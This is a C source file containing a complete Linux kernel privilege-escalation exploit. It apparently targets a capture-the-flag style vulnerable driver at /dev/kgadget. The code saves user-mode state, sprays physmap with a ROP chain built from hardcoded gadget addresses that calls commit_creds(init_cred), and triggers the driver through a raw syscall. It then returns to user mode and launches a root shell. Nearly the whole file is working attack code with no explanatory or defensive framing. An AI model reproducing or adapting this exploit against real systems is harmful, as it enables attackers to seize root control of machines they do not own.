#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <ctype.h>
#include <sys/types.h>

static size_t pop_rdi = 0xffffffff8108c6f0; // pop rdi ; ret
static size_t pop_rsp = 0xffffffff811483d0; // pop rsp ; ret
static size_t init_cred = 0xffffffff82a6b700;
static size_t commit_creds = 0xffffffff810c92e0;
static size_t swapgs = 0xffffffff81c0129c; // swapgs ; nop ; nop ; nop ; ret
static size_t iretq = 0xffffffff810002df;
static size_t add_rsp_0xc0 = 0xffffffff810737fe;
static size_t swapgs_restore_regs_and_return_to_usermode = 0xffffffff81c00fb0;
int fd;

size_t user_cs, user_ss, user_rflags, user_rsp;
void save_status()
{
	__asm__("mov user_cs, cs;"
		"mov user_ss, ss;"
		"mov user_rsp, rsp;"
		"pushf;"
		"pop user_rflags;");
	puts("\033[32m[+]save status successfully\033[0m");
}


void get_root_shell()
{
	if (!getuid())
	{
		puts("\033[32m[+]Root privilege\033[0m");
		system("/bin/sh");
	} else {
		puts("\033[31m[X]Failed to get root privilege\033[0m");
		exit(-1);
	}
}

void physmap_spary()
{
	int i = 0, j = 0;
	size_t* rop; 
	for (i = 0; i < 15000; i++)
	{
		rop = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
		
		for (j = 0; j < 2048/8; j++) rop[j] = add_rsp_0xc0;
		for (;j < 4096/8; j++) rop[j] = pop_rdi+1;
		rop[--j] = user_ss;
		rop[--j] = user_rsp;
		rop[--j] = user_rflags;
		rop[--j] = user_cs;
		rop[--j] = (size_t)get_root_shell;
		rop[--j] = 0;
		rop[--j] = 0;
		rop[--j] = swapgs_restore_regs_and_return_to_usermode+27;
		rop[--j] = commit_creds;
		rop[--j] = init_cred;
		rop[--j] = pop_rdi;
	}
	puts("\033[32m[+]physamp spary successfully\033[0m");
}



int main(int argc, char** argv, char** env)
{
	save_status();
	fd = open("/dev/kgadget", O_RDWR);
	
	physmap_spary();

	__asm__(
	"mov r15, 0x11111111;"
	"mov r14, 0x22222222;"
	"mov r13, 0x33333333;"
	"mov r12, 0x44444444;"
	"mov r11, 0x55555555;"
	"mov rbp, 0x66666666;"
	"mov rbx, 0x77777777;"
	"mov r11, 0x88888888;"
	"mov r10, 0x99999999;"
	"mov r9,  pop_rsp;"
	"mov r8,  0xffff888000000000+0x6000000;"
	"mov rax, 0x10;"
	"mov rcx, 0xDDDDDDDD;"
	"mov rdx, 0xffff888000000000+0x6000000;"
	"mov rsi, 0x1BF52;"
	"mov rdi, fd;"
	"syscall"
	);	
        return 0;
}
